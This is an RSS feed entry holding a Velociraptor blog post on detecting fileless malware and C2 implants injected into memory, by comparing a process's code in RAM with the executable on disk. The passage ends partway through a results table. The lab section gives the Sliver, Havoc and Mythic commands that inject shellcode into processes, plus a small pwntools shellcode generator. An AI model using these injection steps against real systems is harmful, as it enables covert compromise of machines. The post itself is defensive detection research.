@@ -1,0 +1,2244 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DFIR on Velociraptor - Digging deeper!</title><link>https://docs.velociraptor.app/tags/dfir/</link><description>Recent content in DFIR on Velociraptor - Digging deeper!</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Dec 2025 15:24:10 +0100</lastBuildDate><atom:link href="https://docs.velociraptor.app/tags/dfir/index.xml" rel="self" type="application/rss+xml"/><item><title>Memory Analysis with Velociraptor - Part 2</title><link>https://docs.velociraptor.app/blog/2025/2025-12-22-memory-analysis-pt2/</link><pubDate>Mon, 22 Dec 2025 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2025/2025-12-22-memory-analysis-pt2/</guid><description>&lt;p&gt;In &lt;a href="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1/" &gt;Memory Analysis with Velociraptor - Part 1&lt;/a&gt;
+ we looked at how to access
+the RAM with Velociraptor. In this post, we look at how to find fileless
+malware.&lt;/p&gt;
+&lt;h1 id="0-abstract"&gt;0. Abstract&lt;/h1&gt;
+&lt;p&gt;Commonly, in an incident response scenario one has a live attacker in the
+network but does not know which systems are compromised. Networks can be quite
+large and include &amp;gt;10.000 systems. Additionally, attackers nowadays use Command
+and Control (C2) frameworks running in Random Access Memory (RAM).&lt;/p&gt;
+&lt;p&gt;Our approach finds the C2 frameworks without knowing where the attacker is,
+without dumping the RAM and scaling to &amp;gt;10.000 systems.&lt;/p&gt;
+&lt;p&gt;Our custom Velociraptor Query Language (VQL) artifact
+&lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/windows.memory.mem2disk/" &gt;Windows.Memory.Mem2Disk&lt;/a&gt;
+ compares the code in
+the .text segment of every process to the code of the executable on
+disk. Leveraging Velociraptor, we can execute this artifact on &amp;gt;10.000 systems
+simultaneously and we can analyze the RAM live without actually dumping it.&lt;/p&gt;
+&lt;h1 id="1-introduction"&gt;1. Introduction&lt;/h1&gt;
+&lt;p&gt;The most difficult to detect cyber attacks nowadays are RAM-only
+attacks or fileless attacks. As most security tools focus on
+detections in persistent storage (hard disks), attackers avoid them by
+leveraging the RAM. Commonly, malicious code is injected into
+legitimate processes live in RAM.&lt;/p&gt;
+&lt;p&gt;We already detected fileless malware in a &lt;a href="https://github.com/lautarolecumberry/DetectingFilelessMalware/blob/main/DetectingFilelessMalware.pdf" target="_blank" &gt;proof-of-concept
+implementation&lt;/a&gt;
+. Our
+goal is now to improve detection and to detect fileless instances of
+professional C2 frameworks live without dumping the RAM across a network of
+computers.&lt;/p&gt;
+&lt;h1 id="2-background-and-existing-techniques"&gt;2. Background and Existing Techniques&lt;/h1&gt;
+&lt;h2 id="21-process-injection"&gt;2.1. Process injection&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/" target="_blank" &gt;Process injection&lt;/a&gt;
+ is a
+code injection technique used to execute arbitrary code within the
+address space of another, possibly legitimate process. The purpose is
+to evade process-based defenses and escalate privileges. There are
+many ways of achieving this, e.g.:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/012/" target="_blank" &gt;Process hollowing&lt;/a&gt;
+
+is a sub-technique of process injection. It works by creating a
+process in a suspended state, unmapping its memory, and then
+replacing it with custom (malicious) code. The custom code is
+executed under the identity of the previously created process,
+hollowing it.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/003/" target="_blank" &gt;Thread Execution
+Hijacking&lt;/a&gt;
+ is
+comparable to process hollowing but instead of creating a new
+process, it controls a live thread in an existing process. To
+accomplish this, it is necessary to pause the running thread.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://unprotect.it/technique/inline-hooking/" target="_blank" &gt;Inline hooking&lt;/a&gt;
+ is
+a method used to intercept calls to functions. The first few bytes
+of the target function in memory are overwritten with a jump
+instruction, redirecting the execution flow to a custom function.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;With &lt;a href="https://attack.mitre.org/techniques/T1055/001/" target="_blank" &gt;DLL injection&lt;/a&gt;
+
+an adversary modifies an existing Dynamic-Link Library (DLL) or adds
+a new DLL to an existing process. An example for a DLL modification
+is DLL hollowing analogous to process hollowing while new libraries
+can e.g. be added by manipulating the Import Address Table (IAT)
+of the executable.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A full list of process injection techniques can be found at &lt;a href="https://attack.mitre.org/techniques/T1055/" target="_blank" &gt;Mitre:
+Process injection&lt;/a&gt;
+.&lt;/p&gt;
+&lt;h2 id="22-volatility--malfind"&gt;2.2. Volatility &amp;amp; Malfind&lt;/h2&gt;
+&lt;p&gt;One of the main existing tools to analyze the RAM is
+&lt;a href="https://github.com/volatilityfoundation/volatility3" target="_blank" &gt;volatility&lt;/a&gt;
+. It requires
+creating an offline RAM dump first with other tools like
+&lt;a href="https://github.com/Velocidex/WinPmem" target="_blank" &gt;WinPmem&lt;/a&gt;
+ which takes considerable
+time. Afterwards, this dump can be analyzed with volatility.&lt;/p&gt;
+&lt;p&gt;Most commands of volatility require in-depth knowledge of the RAM and the
+operating system. An exception is &lt;code&gt;malfind&lt;/code&gt;, which searches for memory pages
+that are writable and executable. The hypothesis is that memory pages are
+either writable or executable. If executable pages are writable again, it means
+an injection took place and the page is flagged.&lt;/p&gt;
+&lt;h2 id="23-hollowshunter"&gt;2.3. Hollowshunter&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://github.com/hasherezade/hollows_hunter" target="_blank" &gt;Hollowshunter&lt;/a&gt;
+ scans the RAM of
+one machine for various malware injection techniques. It uses
+&lt;a href="https://github.com/hasherezade/pe-sieve" target="_blank" &gt;PE-sieve&lt;/a&gt;
+, a tool to scan a single
+process.&lt;/p&gt;
+&lt;h2 id="24-memprocfs"&gt;2.4. MemProcFS&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://github.com/ufrisk/MemProcFS" target="_blank" &gt;MemProcFS&lt;/a&gt;
+ provides a filesystem-like
+view of the RAM. This way, files can easily be accessed. However, detection of
+malware is mostly left to the analyst.&lt;/p&gt;
+&lt;h1 id="3-methodology"&gt;3. Methodology&lt;/h1&gt;
+&lt;p&gt;To test against C2 frameworks, we use the most common open source C2 frameworks
+and inject shellcode (e.g. an implant) into a legitimate process. The utilized
+C2 frameworks are &lt;a href="https://github.com/BishopFox/sliver" target="_blank" &gt;Sliver&lt;/a&gt;
+,
+&lt;a href="https://github.com/HavocFramework/Havoc" target="_blank" &gt;Havoc&lt;/a&gt;
+, and
+&lt;a href="https://github.com/its-a-feature/Mythic" target="_blank" &gt;Mythic&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;Our test setup consists of two virtual machines, a Kali machine (attacker) and
+a Windows 10 host (victim). Both machines can reach each other and the
+anti-virus (Windows Defender) is turned off. Anti-virus bypasses are not the
+focus in this article and were therefore excluded.&lt;/p&gt;
+&lt;h2 id="31-sliver-setup"&gt;3.1. Sliver Setup&lt;/h2&gt;
+&lt;p&gt;We create a Sliver HTTP agent and deploy it on the victim computer.
+Afterwards, we create a beacon and injected it using &lt;code&gt;execute-assembly --ppid &amp;lt;ppid&amp;gt; --process &amp;lt;process.exe&amp;gt; ./beacon.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id="32-havoc-setup"&gt;3.2. Havoc Setup&lt;/h2&gt;
+&lt;p&gt;After creating and executing the Havoc agent, we use &lt;code&gt;shellcode inject x64 &amp;lt;pid&amp;gt; /path/to/shellcode.bin&lt;/code&gt; to inject into a process.&lt;/p&gt;
+&lt;h2 id="33-mythic-setup"&gt;3.3. Mythic Setup&lt;/h2&gt;
+&lt;p&gt;Similar to Sliver and Havoc, we create a Mythic agent and we deploy it. We use
+the &lt;code&gt;Apollo&lt;/code&gt; agent and &lt;code&gt;http&lt;/code&gt; C2 profile.&lt;/p&gt;
+&lt;p&gt;To inject into a process we use &lt;code&gt;shinject -PID &amp;lt;pid&amp;gt; -File /path/to/shellcode.bin&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id="34-shellcode"&gt;3.4. Shellcode&lt;/h2&gt;
+&lt;p&gt;The shellcode used in the tests is created using the Python &lt;code&gt;pwntools&lt;/code&gt; library
+with the following script.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-python"&gt;from pwn import *
+
+context.update(arch=&amp;quot;amd64&amp;quot;)
+path = &amp;quot;C:\\Program Files\\example\\example.exe&amp;quot;
+pay = (asm(shellcraft.amd64.windows.winexec(path)))
+
+with open(&amp;quot;shellcode.bin&amp;quot;, &amp;quot;wb&amp;quot;) as bf:
+ bf.write(pay)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We simply start a random executable with the shellcode. Usually, an attacker
+would start a beacon or backdoor.&lt;/p&gt;
+&lt;h1 id="4-technique"&gt;4. Technique&lt;/h1&gt;
+&lt;h2 id="41-velociraptor"&gt;4.1. Velociraptor&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://docs.velociraptor.app/blog/2025/2025-11-15-memory-analysis-pt1/" &gt;Memory Analysis with Velociraptor - Part 1&lt;/a&gt;
+ already described in depth
+how to access the RAM with Velociraptor. This works live with the accessors of
+Velociraptor, so we do not need to dump the entire RAM. It scales up to
+thousands of computers, therefore, we can detect C2 frameworks in entire
+networks without previously knowing which machines are infected.&lt;/p&gt;
+&lt;p&gt;Our detection technique, &lt;code&gt;Windows.Memory.Mem2Disk&lt;/code&gt;, compares the .text segment
+of running processes to the executable on disk. Any deviation indicates
+suspicious behaviour, i.e. mostly RAM injections.&lt;/p&gt;
+&lt;h2 id="42-baseofdata-and-aslr"&gt;4.2. BaseOfData and ASLR&lt;/h2&gt;
+&lt;p&gt;While this detection sounds trivial, code in RAM and code on disk should not
+match. Address Space Layout Randomization (ASLR) and Relative Virtual Address
+(RVA) introduce offsets to the RAM.&lt;/p&gt;
+&lt;p&gt;Interestingly, in our experiments, most of the time code in RAM perfectly
+matched the code on disk. As it turns out, modern compilers and linkers nearly
+exclusively use relative jumps instead of absolute ones.&lt;/p&gt;
+&lt;p&gt;The only common exception we found in our experiments was the RVA &lt;code&gt;BaseOfDate&lt;/code&gt;
+of 32-bit executables (see
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-image-only" target="_blank" &gt;Microsoft&lt;/a&gt;
+
+and &lt;a href="https://0xrick.github.io/win-internals/pe4/" target="_blank" &gt;0xrick&lt;/a&gt;
+ for details).&lt;/p&gt;
+&lt;p&gt;In the first stage of our experiments, &lt;code&gt;BaseOfData&lt;/code&gt; introduced changes
+to the .text segment of one byte. For example, in our analysis of
+&lt;code&gt;firefox.exe&lt;/code&gt; process, we observed the differences shown in
+Table 1. Since &lt;code&gt;BaseOfData&lt;/code&gt; is a relative address, the offset between
+code and memory content is always the same (as shown in the table). It
+actually represents Address Space Layout Randomization (ASLR) and,
+thus, while we only observed one byte offsets, it is actually a 32-bit
+offset. &lt;code&gt;BaseOfData&lt;/code&gt; only exists for 32-bit programs, which is why we
+only observed these offsets for 32-bit binaries.&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;Memory&lt;/th&gt;
+ &lt;th&gt;Disk&lt;/th&gt;
+ &lt;th&gt;Times&lt;/th&gt;
+ &lt;th&gt;Difference&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x44&lt;/td&gt;
+ &lt;td&gt;0x06&lt;/td&gt;
+ &lt;td&gt;2724&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x45&lt;/td&gt;
+ &lt;td&gt;0x07&lt;/td&gt;
+ &lt;td&gt;2385&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x42&lt;/td&gt;
+ &lt;td&gt;0x04&lt;/td&gt;
+ &lt;td&gt;21&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x40&lt;/td&gt;
+ &lt;td&gt;0x02&lt;/td&gt;
+ &lt;td&gt;27&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x43&lt;/td&gt;
+ &lt;td&gt;0x05&lt;/td&gt;
+ &lt;td&gt;12&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;0x41&lt;/td&gt;
+ &lt;td&gt;0x03&lt;/td&gt;
+ &lt;td&gt;1&lt;/td&gt;
+ &lt;td&gt;62 (0x3e)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Table 1: 32-bit Firefox &lt;code&gt;BaseOfData&lt;/code&gt; offsets&lt;/p&gt;
+&lt;p&gt;Thanks to Mike Cohen we were able to improve our VQL code, calculate the ASLR
+offset and ignore these false positives. Thus, eliminating false positives from
+ASLR as well as &lt;code&gt;BaseOfData&lt;/code&gt; in one go.&lt;/p&gt;
+&lt;p&gt;Afterwards, none of the legitimate processes we analyzed were detected (see
+Table 2).&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;Name&lt;/th&gt;
+ &lt;th&gt;BaseOfData&lt;/th&gt;
+ &lt;th&gt;Detected&lt;/th&gt;
+ &lt;th&gt;Detected ignoring ASLR&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Adobe Acrobat Reader&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Command Prompt&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Discord&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Google Chrome (x32)&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Google Chrome (x64)&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;LibreOffice Writer&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;LibreOffice Calc&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Microsoft Edge&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Microsoft Edge Updates&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Microsoft Teams&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Mozilla Firefox (x32)&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Mozilla Firefox (x64)&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Spotify&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Velociraptor&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;VLC&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Windows Calculator&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;WordPad&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;Zoom&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Table 2: Legitimate binaries with and without ignoring ASLR&lt;/p&gt;
+&lt;h1 id="5-results"&gt;5. Results&lt;/h1&gt;
+&lt;p&gt;Additionally to legitimate binaries, we tested the (RAM-based) malware samples
+shown in Table 3.&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;Num&lt;/th&gt;
+ &lt;th&gt;Sample&lt;/th&gt;
+ &lt;th&gt;Detected&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;1&lt;/td&gt;
+ &lt;td&gt;AgentTesla&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;2&lt;/td&gt;
+ &lt;td&gt;AssemblyInjection&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;3&lt;/td&gt;
+ &lt;td&gt;Astaroth&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;4&lt;/td&gt;
+ &lt;td&gt;Azorult&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;5&lt;/td&gt;
+ &lt;td&gt;BADNEWS&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;6&lt;/td&gt;
+ &lt;td&gt;bandook&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;7&lt;/td&gt;
+ &lt;td&gt;Donut&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;8&lt;/td&gt;
+ &lt;td&gt;Dyre&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;9&lt;/td&gt;
+ &lt;td&gt;Empire&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;10&lt;/td&gt;
+ &lt;td&gt;Gh0stRAT&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;11&lt;/td&gt;
+ &lt;td&gt;GuLoader&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;12&lt;/td&gt;
+ &lt;td&gt;Havoc C2&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;13&lt;/td&gt;
+ &lt;td&gt;HopLight&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;14&lt;/td&gt;
+ &lt;td&gt;HyperBro&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;15&lt;/td&gt;
+ &lt;td&gt;Injection PoC&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;16&lt;/td&gt;
+ &lt;td&gt;ISMAgent&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;17&lt;/td&gt;
+ &lt;td&gt;lokibot&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;18&lt;/td&gt;
+ &lt;td&gt;Mythic C2&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;19&lt;/td&gt;
+ &lt;td&gt;netwire&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;20&lt;/td&gt;
+ &lt;td&gt;Pandora&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;21&lt;/td&gt;
+ &lt;td&gt;Platinum Group&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22&lt;/td&gt;
+ &lt;td&gt;qakbot&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;23&lt;/td&gt;
+ &lt;td&gt;remcos&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;24&lt;/td&gt;
+ &lt;td&gt;REvil&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;25&lt;/td&gt;
+ &lt;td&gt;RokRAT&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;26&lt;/td&gt;
+ &lt;td&gt;Ryuk&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;27&lt;/td&gt;
+ &lt;td&gt;sliver C2&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;28&lt;/td&gt;
+ &lt;td&gt;Slothful Media&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;29&lt;/td&gt;
+ &lt;td&gt;smokeloader&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;30&lt;/td&gt;
+ &lt;td&gt;synack&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;31&lt;/td&gt;
+ &lt;td&gt;TsCookie&lt;/td&gt;
+ &lt;td&gt;no&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;32&lt;/td&gt;
+ &lt;td&gt;ursnif&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;33&lt;/td&gt;
+ &lt;td&gt;WarzoneRAT&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;34&lt;/td&gt;
+ &lt;td&gt;WhisperGate&lt;/td&gt;
+ &lt;td&gt;yes&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Table 3: Tested malware samples and their detection&lt;/p&gt;
+&lt;p&gt;Injecting code into legitimate programs with all three tested C2 frameworks
+(Sliver, Havoc, and Mythic) is detected by &lt;code&gt;Mem2Disk&lt;/code&gt;. Additionally, 21 further
+malware samples were successfully detected.&lt;/p&gt;
+&lt;p&gt;We usually injected into a running &lt;code&gt;Calculator&lt;/code&gt; app. Figure 1 and 2 show
+screenshots of the detections for Havoc C2 and Mythic C2 respectively. The left
+side of the screen shows the attacker virtual machine while the right side
+shows the victim including the Velociraptor detection. &lt;code&gt;Process Hacker&lt;/code&gt; was
+also displayed to show the PID of the &lt;code&gt;Calculator&lt;/code&gt; app. As shown in the two
+screenshots, both times Velociraptor detects &lt;code&gt;Calculator&lt;/code&gt; as compromised.&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-12-22-memory-analysis-pt2//blog/2025/2025-12-22-memory-analysis-pt2/2025-05-05_HavocC2_Calculator_Injection.png"
+ class="inline"
+ alt="Figure 1: Havoc C2 Detection"
+ width="2304" height="1046"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="2025-05-05_HavocC2_Calculator_Injection.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Figure 1: Havoc C2 Detection
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Figure 1: Havoc C2 Detection&lt;/p&gt;
+&lt;p&gt;
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+ &lt;div class="figure"&gt;
+ &lt;img src="https://docs.velociraptor.app/blog/2025/2025-12-22-memory-analysis-pt2//blog/2025/2025-12-22-memory-analysis-pt2/2025-05-05_MythicC2_Calculator_Injection.png"
+ class="inline"
+ alt="Figure 2: Mythic C2 Detection"
+ width="2304" height="1044"&gt;
+ &lt;/div&gt;
+ &lt;figcaption&gt;
+ &lt;a class="image-link"
+ target="_blank" rel="noopener noreferrer"
+ href="2025-05-05_MythicC2_Calculator_Injection.png"&gt;
+ &lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;/a&gt;
+ Figure 2: Mythic C2 Detection
+ &lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+
+
+&lt;/p&gt;
+&lt;p&gt;Figure 2: Mythic C2 Detection&lt;/p&gt;
+&lt;p&gt;Table 4 shows our full evaluation. Numbers in brackets are the amount
+of samples in this category.&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;&lt;/th&gt;
+ &lt;th&gt;Not-detected&lt;/th&gt;
+ &lt;th&gt;Detected&lt;/th&gt;
+ &lt;th&gt;Total&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;strong&gt;Non-malware&lt;/strong&gt;&lt;/td&gt;
+ &lt;td&gt;35% (18)&lt;/td&gt;
+ &lt;td&gt;0% (0)&lt;/td&gt;
+ &lt;td&gt;35% (18)&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;strong&gt;Malware&lt;/strong&gt;&lt;/td&gt;
+ &lt;td&gt;19% (10)&lt;/td&gt;
+ &lt;td&gt;46% (24)&lt;/td&gt;
